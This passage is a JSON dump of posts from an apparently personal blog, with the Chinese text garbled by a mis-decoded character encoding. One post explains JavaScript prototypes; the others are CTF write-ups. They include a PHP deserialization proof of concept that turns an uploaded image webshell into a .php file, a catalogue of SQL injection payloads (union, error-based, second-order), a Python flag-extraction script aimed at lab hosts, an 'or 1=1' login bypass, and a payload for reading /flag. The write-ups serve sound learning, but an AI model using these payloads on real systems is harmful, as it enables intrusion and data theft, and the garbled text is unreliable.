æ¥å‰é¢çš„ä¾‹å­console.log(Object.getPrototypeOf(myFather) === Person.prototype); //trueconsole.log(Person.prototype.isPrototypeOf(myFather)); //trueconsole.log(Person.prototype.isPrototypeOf(myMother)); //false å¯¹è±¡çš„åŸå‹é“¾é€šå¸¸æ˜¯åªè¯»çš„ï¼Œç”¨æˆ·æ— æ³•ä¿®æ”¹æŸä¸ªå¯¹è±¡çš„åŸå‹ï¼Œæ‰€ä»¥æ— æ³•ä¿®æ”¹å¯¹è±¡çš„ç»§æ‰¿å…³ç³»ã€‚ å±æ€§protoåœ¨jsè§„èŒƒé‡Œï¼Œå¯¹è±¡åŸå‹é€šå¸¸æ˜¯ä¸å¯è§çš„å±æ€§ï¼Œå› æ­¤æ— æ³•ç›´æ¥è®¿é—®ã€‚ä½†æŸäº›æµè§ˆå™¨é‡Œæ”¯æŒ__proto__å±æ€§ï¼Œfirefox/chrome/safari/nodejséƒ½æ”¯æŒ__proto__å±æ€§ï¼Œåœ¨è¿™äº›æµè§ˆå™¨é‡Œå¯¹è±¡åŸå‹æ˜¯å¯è§çš„ï¼Œå¯ä»¥ç›´æ¥è®¿é—®å¯¹è±¡çš„__proto__å±æ€§å¾—åˆ°å¯¹è±¡åŸå‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹å¯¹è±¡çš„__proto__å±æ€§æ¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹é“¾ã€‚ ECMAScript 6æ­£åœ¨è®¨è®ºæŠŠ__proto__å±æ€§æ ‡å‡†åŒ–ï¼Œä½†ç›®å‰å±æ€§__proto__è¿˜ä¸æ˜¯æ ‡å‡†ã€‚ æœ¬æ–‡æ¥ä¸‹æ¥æåˆ°çš„__proto__, [[prototype]]éƒ½æ˜¯æŒ‡ä¸€ä¸ªæ„æ€ï¼Œå³è‡ªèº«å¯¹è±¡é‡ŒæŒ‡å‘å…¶åŸå‹å¯¹è±¡çš„å±æ€§ã€‚ prototypeå‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥å‡½æ•°ä¹Ÿæœ‰å±æ€§__proto__ï¼Œé€šè¿‡å­—é¢é‡å£°æ˜çš„å‡½æ•°å…¶åŸå‹å¯¹è±¡æ˜¯Function.prototypeï¼Œå½“ç„¶Function.prototypeçš„åŸå‹å¯¹è±¡æ˜¯Object.prototype. å‡½æ•°è¿˜æœ‰ä¸€ä¸ªç‰¹æœ‰çš„å±æ€§prototypeï¼Œæ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼ˆç‰¹åˆ«æ³¨æ„ï¼Œprototypeå±æ€§æ˜¯å‡½æ•°å¯¹è±¡ç‰¹æœ‰çš„å±æ€§ï¼Œä¸è¦å’Œjsä¸­æ¯ä¸ªå¯¹è±¡åˆ°å…¶åŸå‹çš„è¿æ¥ç›¸æ··æ·†ï¼Œé‚£ä¸ªæ˜¯éšè—çš„ï¼Œåªæ˜¯åœ¨firefox/chromeç­‰æµè§ˆå™¨ä¸­ä½ å¯ä»¥ä½¿ç”¨__proto__è®¿é—®åˆ°ï¼‰ constructorObject.prototype.constructorè¿”å›åˆ›å»ºå®ä¾‹å¯¹è±¡çš„ Object æ„é€ å‡½æ•°çš„å¼•ç”¨ã€‚æ³¨æ„ï¼Œæ­¤å±æ€§çš„å€¼æ˜¯å¯¹å‡½æ•°æœ¬èº«çš„å¼•ç”¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªåŒ…å«å‡½æ•°åç§°çš„å­—ç¬¦ä¸²ã€‚å¯¹åŸå§‹ç±»å‹æ¥è¯´ï¼Œå¦‚1ï¼Œtrueå’Œ&quot;test&quot;ï¼Œè¯¥å€¼åªå¯è¯»ã€‚ è¯¦æƒ…æ‰€æœ‰å¯¹è±¡éƒ½ä¼šä»å®ƒçš„åŸå‹ä¸Šç»§æ‰¿ä¸€ä¸ªconstructorå±æ€§: var o = {};o.constructor === Object; // true ç¤ºä¾‹:function Tree(name){this.name=name;}var theTree=new Tree(&quot;Redwood&quot;);console.log(&quot;theTree.constructor is &quot;+the Tree.constructor);//æ‰“å°è¾“å‡ºtheTree.constructor is function Tree(name) { this.name = name;} å°ç»“å¤§æ¦‚æ•´ç†ä¸€ä¸‹jsçš„å¯¹è±¡çš„ä¸€äº›åŸºç¡€æ¦‚å¿µï¼Œ1.æ¯ä¸ªå¯¹è±¡éƒ½æœ‰[[prototype]]å±æ€§ï¼Œæ˜¯ç”¨æ¥æŒ‡å‘è‡ªå·±çš„åŸå‹å¯¹è±¡2.æ‰€æœ‰å¯¹è±¡çš„[[prototype]]æ˜¯_proto_ï¼Œè€Œå‡½æ•°æœ‰ä¸€ä¸ªç‰¹æœ‰çš„å±æ€§æ˜¯prototype3.prototypeæœ‰ä¸ªå±æ€§æ˜¯constructoræŒ‡å‘å…¶åŸå‹å¯¹è±¡çš„ï¼Œå¯ä»¥è¿›è¡Œè°ƒç”¨ã€‚","link":"/2021/07/13/%E8%AE%BAjs%E7%9A%84%E5%AF%B9%E8%B1%A1/"},{"title":"2019å¼ºç½‘æ¯upload","text":"[å¼ºç½‘æ¯ 2019]Uploadwww.tar.gzæœ‰ä»–çš„æºç ï¼Œæ³¨å†Œä»¥åå‘ç°å¯ä»¥æ–‡ä»¶ä¸Šä¼ ï¼Œå®¡è®¡ä¸€ä¸‹ä»–çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼šå°†ä¸Šä¼ çš„æ–‡ä»¶çš„åç¼€æ›´æ”¹ä¸ºpng ç„¶åä½¿ç”¨getimagesizeæ£€æŸ¥æ–‡ä»¶å¤´æ˜¯å¦ä¸ºå›¾ç‰‡ æ–‡ä»¶ä¸Šä¼ è¿™é‡Œä¼¼ä¹æ²¡æœ‰å¤ªå¤šæœºä¼šï¼Œå¯èƒ½éœ€è¦å“ªé‡Œè¾…åŠ©ä¸€ä¸‹è¿™é‡Œæœ‰ä¸ªååºåˆ—åŒ–å‡½æ•°ï¼Œå¯ä»¥å¯¹profileè¿›è¡Œèµ‹å€¼ åº•ä¸‹æœ‰ä¸¤ä¸ªé­”æœ¯æ–¹æ³•: getï¼šè¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§æ—¶è°ƒç”¨ callï¼šè°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è°ƒç”¨ çœ‹äº†ä¸€ä¸‹å…¶ä»–åœ°æ–¹å‘ç°æœ‰ä¸ªdestructæ–¹æ³• æ€è·¯æ•´ç†1.æ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶åœ¨äºåç¼€åä¼šè¢«å¼ºåˆ¶æ›´æ”¹ä¸ºpng2.å¯ä»¥å¯¹cookieçš„å€¼è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šè§¦å‘getã€callé­”æœ¯æ–¹æ³•è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§å’Œæ–¹æ³•å¯¹profileè¿›è¡Œé‡æ–°èµ‹å€¼æ“ä½œ3.å¦‚ä½•å°†profileå’Œæ›´æ¢æ–‡ä»¶åç¼€è”ç³»åœ¨ä¸€èµ·å‘¢ï¼Ÿâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨upload_img()å‡½æ•°ä¸­æœ‰ä¸€ä¸ªcopyå‡½æ•°ï¼Œå°†filename_tmpçš„å€¼èµ‹ç»™äº†filenameã€‚é‚£ä¹ˆæ€è·¯å°±æ˜¯è¿™æ ·ï¼š1.å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬2.ç„¶åé€šè¿‡cookieä¼ å…¥ååºåˆ—åŒ–å†…å®¹ï¼Œå…¶ä¸­ååºåˆ—åŒ–çš„æ€è·¯åº”è¯¥æ˜¯è¿™æ ·çš„:ä¸ºäº†ä½¿ç”¨callå’Œgetæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è°ƒç”¨æ²¡æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œprofile.phpä¸­æ²¡æœ‰registerä¸­çš„æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¯ä»¥å…ˆå†™ä¸€æ³¢: $registed=new Register();$registed-&gt;registed=false;$registed-&gt;checker=$profiled; æ¥ä¸‹æ¥å°±ä¼šè°ƒç”¨profileé‡Œé¢çš„getå’Œcallæ–¹æ³•:é¦–å…ˆä¼šè°ƒç”¨callæ–¹æ³•å› ä¸ºindexæ–¹æ³•ä¸å­˜åœ¨å†profileç±»é‡Œé¢ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ©ç”¨callæ–¹æ³•è°ƒç”¨upload_img()ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨getæ–¹æ³•å¯¹nameèµ‹å€¼ï¼Œç”±äºgetæ˜¯è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¾æ—§æ˜¯åˆ©ç”¨indexæ¥ä½œä¸ºä¸€ä¸ªè·³æ¿ç½®æ¢æˆupload_img(),ç„¶åæœ‰å‡ ä¸ªåˆ¤æ–­æ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„ï¼Œå…¶ä¸­åŒ…æ‹¬æ£€æŸ¥extæ˜¯å¦ä¸ºpng $profiled=new Profile();$profiled-&gt;except=['index'=&gt;'upload_img'];$profiled-&gt;ext=&quot;png&quot;;$profiled-&gt;filename=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;;$profiled-&gt;filename_tmp=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;; å®Œæ•´çš„pocå¦‚ä¸‹ &lt;?phpclass Profile{ public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) { return $this-&gt;except[$name]; } public function __call($name, $arguments) { if ($this-&gt;{$name}) { $this-&gt;{$this-&gt;{$name}}($arguments); } }} class Register{ public $checker; public $registed; public function __destruct() { if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); } } }$profiled=new Profile();$profiled-&gt;except=['index'=&gt;'upload_img'];$profiled-&gt;ext=&quot;png&quot;;$profiled-&gt;filename=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;;$profiled-&gt;filename_tmp=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;;$registed=new Register();$registed-&gt;registed= false;$registed-&gt;checker=$profiled;echo urlencode(base64_encode(serialize($registed)));?&gt; è¿™æ˜¯æˆ‘åœ¨æœ¬åœ°æ„å»ºçš„ï¼Œå°†æ‰€æœ‰ç”¨åˆ°çš„ç±»æ•´åˆåˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œæ–¹ä¾¿è¿›è¡Œè°ƒè¯•æŸ¥çœ‹èµ‹å€¼è¿‡ç¨‹ï¼Œå¦åˆ™è¿˜éœ€è¦åœ¨å¼€å¤´å†åŠ ä¸Š: namespace app\\web\\controller;error_reporting(0); å°†åºåˆ—åŒ–åçš„å†…å®¹ä½¿ç”¨cookieä¼ å…¥å³å¯ï¼Œå‰ææ˜¯å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶é©¬","link":"/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"},{"title":"sqlæ³¨å…¥å¤ä¹ ","text":"å‰è¨€æœ€è¿‘åšåˆ°sqlæ³¨å…¥çš„é¢˜ç›®ï¼Œéƒ½æ²¡æœ‰å¾ˆæ•æ„Ÿäº†ï¼Œäºæ˜¯å†³å®šè¦é‡æ–°å¤ä¹ ä¸€ä¸‹ sqlæ³¨å…¥åŸç†æºç å¯¹ç”¨æˆ·çš„è¾“å…¥çš„å†…å®¹æ²¡æœ‰è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤æœºåˆ¶ï¼Œå¯¼è‡´ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ‹¼æ¥åˆ°sqlè¯­å¥ï¼Œå½±å“åŸæœ¬sqlè¯­å¥çš„åŠŸèƒ½ sqlæ³¨å…¥ç§ç±»ï¼šå›æ˜¾æ³¨å…¥é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è¾“å…¥å†…å®¹ä¼šæœ‰å›æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å›æ˜¾å†…å®¹åˆ¤æ–­æ˜¯å¦æˆåŠŸè¿‡æ»¤ ?id=1'and 1=1'1?id=-1'union select database()--+ #unionè¿˜éœ€è¦æ³¨æ„ä¸€ä¸‹å­—æ®µæ•° æŠ¥é”™æ³¨å…¥æ•°æ®æº¢å‡ºï¼šå°±æ˜¯è¶…è¿‡mysqlçš„æ•°æ®èŒƒå›´ä¼šæŠ¥é”™ï¼šä½†æ˜¯åˆç‰ˆæœ¬é™åˆ¶ï¼š&lt;=5.5.4çš„ä¸‰çšˆä¾å‡ºé‡‘é¢å›¾å°†æŠ¥é”™å†…å®¹æ˜¾ç¤ºå‡ºæ¥ ä¸»é”®é‡å¤//æ•°æ®åº“select * from user where 1=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);//è¡¨åselect * from user where 1=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);//å­—æ®µselect * from user where 1=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name='user' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);//å€¼select * from user where 1=1 and (select 1 from (select count(*),concat((select id from user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); åˆ—åé‡å¤è¿™ä¸ªå¯ä»¥ç”¨åœ¨æ— åˆ—åæ³¨å…¥çš„æ—¶å€™ï¼Œçˆ†å‡ºåˆ—å mysql&gt; select * from (select * from user a join user b)c;ERROR 1060 (42S21): Duplicate column name 'id'mysql&gt; select * from (select * from user a join user b using(id))c;ERROR 1060 (42S21): Duplicate column name 'username' xpathè¯­æ³•æŠ¥é”™æ³¨å…¥åˆ©ç”¨extractvalueæˆ–è€…updatexml ä¸€äº›ç‰¹æ€§æ³¨å…¥å®½å­—èŠ‚æ³¨å…¥çœ‹æ•°æ®åº“ç¼–ç æ˜¯å¦å‘ç”Ÿæ”¹å˜ æ— åˆ—åæ³¨å…¥select 1,2 union select * from user; äºŒæ¬¡æ³¨å…¥ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®åº“çš„æ•°æ®è¢«è¿‡æ»¤ï¼Œä½†æ˜¯åœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨æ‹¼å‡‘è¿‡ç¨‹ä¸­ä»¥è¾“å…¥çš„å½¢å¼è¿›è¡Œç»„åˆï¼Œé€ æˆè¯­å¥æ¶æ„æ‹¼æ¥ [ç½‘é¼æ¯2018]Unfinishæ³¨å†Œä»¥åå‘ç°ç”¨æˆ·åæ˜¾ç¤ºäº†,çŒœæµ‹è¯­å¥æ˜¯ insert into XXX ('','','') values ('','''',''); æ‰€ä»¥æ„é€ ä¸€ä¸‹æ³¨å…¥è¯­å¥ä¸ºï¼š xxxxxxxxxx insert into XXX (email,username,passwd) values ('',''+(select hex(database()))+'',''); åœ¨è¿™é‡Œæˆ‘ä»¬æ˜¯ä½¿ç”¨+å·è¿™ä¸ªè¿ç®—ç¬¦ä½œä¸ºè¿æ¥ç¬¦æŸ¥è¯¢ç»“æœå¯ä»¥ç†è§£ä¸º: 0+database()+0 ä½†æ˜¯å¦‚æœç›´æ¥è¿™æ ·ç›¸åŠ  æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œå› ä¸ºå­—æ¯+æ•°å­—åœ¨mysqlé‡Œé¢åŠ ä¸äº†ä¸º0æ‰€ä»¥è¦è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œä½¿ç”¨hexå‡½æ•°ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œæœ‰çš„å­—ç¬¦ä¸²åªç»è¿‡ä¸€æ¬¡hexè¿˜æ˜¯æœ‰å­—æ¯ï¼Œæ¯•ç«Ÿæ˜¯åå…­è¿›åˆ¶~:æ‰€ä»¥è¦ç»è¿‡ä¸¤æ¬¡åå…­è¿›åˆ¶çš„è½¬æ¢ æ¥ä¸‹æ¥æ˜¯æ„é€ è¯­å¥: username='+(select hex(hex(database())))+' ç»è¿‡ä¸¤æ¬¡hexè§£ç ï¼Œå¾—çŸ¥æ•°æ®åº“åä¸ºweb informationåˆè¢«è¿‡æ»¤äº†--ï¼Œè¿™ä¸ªæ—¶å€™å°±ç›´æ¥çŒœè¡¨åä¸ºflagå°±å¥½äº†~ å‘ç°ä¼šæœ‰ç§‘å­¦è®¡æ•°æ³•eçš„å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šæŸå¤±ç²¾åº¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨substræˆªå– è¿™é‡Œå­¦åˆ°äº†ä¸€ä¸ªæ–°å§¿åŠ¿ï¼Œå°±æ˜¯substr from for å› ä¸ºæ˜¯é€—å·çš„æ—¶å€™ä¼šæŠ¥é”™-- username=0'+(select substr(hex(hex((select * from flag))) from 1 for 10))+'0 ä½æ•°å¾ˆå¤š éœ€è¦ä½¿ç”¨è„šæœ¬ï¼Œè„šæœ¬ç¼–å†™æ€è·¯å¦‚ä¸‹ï¼šå…ˆåœ¨registeræ³¨å†Œè´¦å·ï¼Œç„¶åç”¨loginç™»å½•æŸ¥è¯¢ import requestsimport reurl='http://707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn/register.php'for i in range(0,20): # data={ # &quot;email&quot;:str(i)+'@qq.com', # &quot;username&quot;:&quot;'+substr(hex(hex((select * from flag))) from &quot;+str(i*10+1)+&quot; for 10)+'&quot;, # &quot;password&quot;:&quot;1&quot; # } # r=requests.post(url=url,data=data) url2 = 'http://707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn/login.php' data={ &quot;email&quot;:str(i)+'@qq.com', &quot;password&quot;:&quot;1&quot; } r=requests.post(url=url2,data=data,allow_redirects=True) print (re.findall(&quot;.*?&lt;/span&gt;&quot;,r.text)[0].replace('&lt;/span&gt;','').strip(),end='') è¿™é‡Œæˆ‘æ˜¯å…ˆæ‰¹é‡æ³¨å†Œï¼Œç„¶åå†æ‰¹é‡ç™»å½•é€šè¿‡æ­£åˆ™å®šä½ç¼–ç ä½ç½®ç„¶åç»„è£…ç”±äºç°åœ¨buuå¤ªå®¹æ˜“å´©æºƒæƒ¹ã€‚ã€‚ã€‚æ‰€ä»¥æˆ‘å°±0-5è·å–ä¸€æ¬¡ç„¶å5-10è·å–ä¸€ä¸‹ 363636433631363737423631363433383334363133383633333832443631333033353634324433343634333236363244363233343334333132443333363533393338363536353337333036313338363436333744 ç»“æœå¦‚ä¸Šï¼Œç„¶åhexè§£ç ä¸¤æ¬¡å³å¯ pythonåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼å¿«é€Ÿæˆªå–å®šä½å†…å®¹ä»¥å‰å°±ç»å¸¸åœ¨æƒ³æ€ä¹ˆåœ¨ä¸€å¤§ä¸²çš„ç½‘é¡µå›æ˜¾ä¸­æˆªå–è‡ªå·±æƒ³è¦çš„é‚£éƒ¨åˆ†å†…å®¹ï¼Œåæ¥çœ‹äº†ä¸€ä¸‹å­¦é•¿çš„è„šæœ¬ï¼Œå‘ç°ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥è¾¾åˆ°è¿™ç§æ“ä½œ: importe re#å¼•å…¥reåº“str_txt = &quot;&quot;&quot; if (!mobileVisit) { googletag.defineSlot &quot;div-gpt-ad-15390086850-0&quot;).addService(googletag.pubads()); } &quot;&quot;&quot;comment=re.compile(r'div-gpt-ad-(.*?)-0',re.S)comment1=comment.findall(str_txt)print(comment1[0]) 1.ä½¿ç”¨reæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„compileå‡½æ•°ï¼Œåœ¨åŒ¹é…å†…å®¹çš„æ‹¬å·ä¸­å†™ï¼ˆ.?ï¼‰**2.å…¶ä¸­.\\?ä»£è¡¨éè´ªå¿ƒç®—æ³•ï¼Œè¡¨ç¤ºç²¾å‡†çš„é…å¯¹3.åœ¨.*?çš„å¤–é¢åŠ ä¸ªæ‹¬å·è¡¨ç¤ºè·å–æ‹¬å·ä¹‹é—´çš„ä¿¡æ¯4.åœ¨ï¼ˆ.*?ï¼‰ä¸¤è¾¹åŠ ä¸ŠåŸæ–‡æœ¬ä¸­è¦åŒ¹é…ä¿¡æ¯ä¸¤æ—çš„ä¿¡æ¯ï¼Œä¾‹å¦‚è¦æƒ³è·å¾—å­—ç¬¦ä¸²â€œabcdefgâ€ä¸­çš„cdï¼Œå°±è¦åœ¨ï¼ˆ.*?ï¼‰é‡Œé¢åˆ†åˆ«åŠ ä¸Šabå’Œefg5.compileä¸­ä½¿ç”¨çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯re.Sï¼Œè¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼ä¼šå°†è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼ŒåŒ…æ‹¬â€\\nâ€œï¼Œå¦‚æœä¸ä½¿ç”¨re.Så‚æ•°ï¼Œåˆ™åªåœ¨æ¯ä¸€è¡Œå†…è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœä¸€è¡Œæ²¡æœ‰ï¼Œå°±æ¢ä¸‹ä¸€è¡Œé‡æ–°å¼€å§‹ï¼Œä¸ä¼šè·¨è¡Œ6.compile()å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªåŒ¹é…å¯¹è±¡ï¼Œå•ç‹¬ä½¿ç”¨æ— æ„ä¹‰ï¼Œéœ€è¦å’Œfindall()**å‡½æ•°æ­é…ä½¿ç”¨ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” å‚è€ƒï¼šhttps://blog.csdn.net/weixin_44346972/article/details/106746133","link":"/2021/07/17/sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E4%B9%A0/"},{"title":"buu22","text":"[MRCTF2020]Ezauditéšæ‰‹è¯•äº†ä¸€ä¸‹www.zip==åˆæœ‰æºç äº†ï¼Œ å‰é¢å°±æ˜¯ç™»é™†å•¥å•¥å•¥çš„ï¼Œçœ‹äº†ä¸€ä¸‹å…³é”®æ˜¯è¦æœ‰private_keyï¼Œæ‰€ä»¥çœ‹äº†ä¸€ä¸‹ä¸‹é¢çš„ä»£ç ï¼Œä½¿ç”¨mt_randæ„é€ çš„å…¬é’¥å’Œç§é’¥ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬è·å¾—éšæœºæ•°ç§å­å°±è¡Œäº† å’Œbuu14é‡Œé¢çš„é¢˜ç›®ä¸€æ ·çš„ï¼Œä¸è¿‡æœ€åè¦åˆ°login.htmlè¿›è¡Œç™»å½•ï¼Œå¯†ç å¯ä»¥ç”¨ä¸‡èƒ½é’¥åŒ™â€™or 1=1â€™1è¿™é‡Œæœ‰ä¸ªå¤§å‘ï¼Œä»¥å‰æ²¡æœ‰æ³¨æ„è¿‡ è¿™é‡Œè¦æ±‚phpçš„ç‰ˆæœ¬æ˜¯è¦åœ¨5.2.1åˆ°7.0.xä¹‹é—´çš„ï¼Œä¸ç„¶å‡ºæ¥çš„ç§˜é’¥æ˜¯ä¸åŒ¹é…çš„ [GXYCTF2019]StrongestMindè®¡ç®—æˆåŠŸ1000æ¬¡çœ‹èµ·æ¥æ˜¯è¦å†™ä¸ªè„šæœ¬æ”¹å¤©ä¸€å®šè¦å­¦å­¦ç®—æ³•ï¼Œæ„Ÿè§‰è‡ªå·±å†™çš„ä»£ç éƒ½å¥½å†—é•¿ï¼Œå¯ä»¥å»ä¸–äº†ï¼Œæµ‹è¯•æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ç”±äºç°åœ¨buué™åˆ¶äº†ï¼Œä¸€ä¸‹å­å‘é€å¤ªå¤šè¯·æ±‚ç›´æ¥500äº†ï¼Œæœæƒ¹å¼„äº†æ—¶é—´é—´éš”ä¹Ÿæ²¡ç”¨ï¼Œsoä¸‹ä¸€é¢˜äº† import requestsimport reimport timeurl=&quot;http://e96f1fb4-3b45-487a-ada1-2465e38d9be2.node4.buuoj.cn/&quot;s=requests.session()r = s.post(url=url).textr1=''for i in range(0,10000): if i!=0: r=r1 answer1=re.compile(r'&lt;br&gt;&lt;br&gt;\\d{8}',re.S).findall(r)[0].replace('&lt;br&gt;&lt;br&gt;','') answer2=re.compile(r'\\d{8}&lt;br&gt;&lt;br&gt;',re.S).findall(r)[0].replace('&lt;br&gt;&lt;br&gt;','') sign=re.compile(r' \\W ',re.S).findall(r)[0].replace(' ','') answer1=float(answer1) answer2=float(answer2) if '+' == sign: fina_answer=answer1+answer2 else: fina_answer = answer1-answer2 data={ &quot;answer&quot;:fina_answer } r1 = s.post(url=url, data=data).text #print(r1) print('*'*25) if &quot;bingo!&quot; in r1: print(i) time.sleep(0.5) [å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ å‰ç½®çŸ¥è¯†åšé¢˜è¿‡ç¨‹ä¸­é‡åˆ°ä¸ç†Ÿæ‚‰çš„çŸ¥è¯†ç‚¹å†™åœ¨å‰é¢æ¯”è¾ƒå¥½ phpâ€”foreachç†è§£&lt;?php$arr = [1, 2, 3, 4];foreach($arr as &amp;$value) { $value = $value * 2;}// $arr is now [2, 4, 6, 8]unset($value); // æœ€åå–æ¶ˆæ‰å¼•ç”¨ &lt;?php$arr = [1, 2, 3];foreach ($arr as $k =&gt; &amp;$v) { $v = $v * 2;}//$arr=2 4 6 åŸé¢˜ç›®æœ‰æ–‡ä»¶æ³„éœ²æ‰€ä»¥ç›´æ¥ä¸Šgithubä¸‹è½½ä¸€ä¸‹æºç ç„¶åå¼€å§‹å®¡è®¡~ï¼šåœ¨helper.phpä¸­çœ‹åˆ°ä¸€å¤„åºåˆ—åŒ–ï¼Œå…¶ä¸­è¿™ä¸ªmy_extæ˜¯å›¾ç‰‡çš„å¤§å°ï¼Œå³å®½åº¦å’Œé«˜åº¦ getfile()æ–¹æ³•ï¼Œå­˜åœ¨checkæœºåˆ¶ ä¸¥æ ¼çš„ç™½åå•æ£€æµ‹æœºåˆ¶ï¼Œå› ä¸ºstrrchr() å‡½æ•°ï¼ˆåœ¨phpä¸­ï¼‰æŸ¥æ‰¾å­—ç¬¦åœ¨æŒ‡å®šå­—ç¬¦ä¸²ä¸­ä»å³é¢å¼€å§‹çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿™é‡Œæœ‰ä¸ªæ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯pathä¼¼ä¹è¢«å†™æ­»äº†ï¼Œæš‚æ—¶è¿˜æ²¡æ‰¾åˆ°åˆ©ç”¨ç‚¹ç»§ç»­çœ‹ä¸€ä¸‹å…¶ä»–æ–‡ä»¶ï¼Œåœ¨show.phpä¸­çœ‹åˆ°äº†æ˜¾ç¤ºæ–‡ä»¶çš„ä»£ç ï¼Œå¯¹attr_tempçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œå‰é¢å¯¹å®ƒæ˜¯è¿›è¡Œäº†åºåˆ—åŒ–çš„ è§£é¢˜æ€è·¯é¢˜ç›®ç»™äº†ååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡çœ‹åˆ°ä¸€äº›æœ‰ç”¨çš„è·³æ¿ï¼Œæ„Ÿè§‰æ˜¯è¦ç»“åˆæ•°æ®åº“è¿›è¡Œæ”»å‡»ï¼Œæœ€ååˆ©ç”¨file_get_contentså¾—åˆ°flagï¼Œä½†æ˜¯æ„Ÿè§‰å¯¹äºé‚£äº›å€¼å¯æ§æœ‰ç‚¹èŒ«ç„¶ï¼Œæ‰€ä»¥å†³å®šä¼ å€¼è·Ÿä¸€ä¸‹é¦–å…ˆæ˜¯æ•°æ®åº“é…ç½®ï¼š create database pic_base å¯ä»¥å‘ç°æ–‡ä»¶åæ˜¯å¯æ§çš„å¹¶ä¸”æœ€åæ˜¯attrå‚ä¸ååºåˆ—åŒ–ï¼Œæ³¨æ„åˆ°åˆåŒ…å«äº†helper.phpï¼Œæ‰€ä»¥æ„Ÿè§‰æ˜¯å¯ä»¥è¿›è¡Œconfigå€¼çš„æ›´æ”¹çš„ æ‰€ä»¥æ€è·¯å¦‚ä¸‹ï¼š é¦–å…ˆæ„é€ ååºåˆ—åŒ–å¯¹configé‡æ–°èµ‹å€¼ï¼Œç„¶åé€šè¿‡sqlæ³¨å…¥ä½¿æœ¬æ¥åº”è¯¥titleçš„åºåˆ—åŒ–è¯­å¥è·‘åˆ°attrå­—æ®µï¼Œç„¶åé€šè¿‡è®¿é—®è¯¥å›¾ç‰‡ï¼Œå³å¯è·å¾—flagæ„é€ ååºåˆ—åŒ–è¯­å¥ class helper{ protected $ifview=True; protected $config=&quot;/flag&quot;;}$a=new helper();echo bin2hex(serialize($a); ç„¶åç”±äºè¿™ä¸ªæ˜¯protected 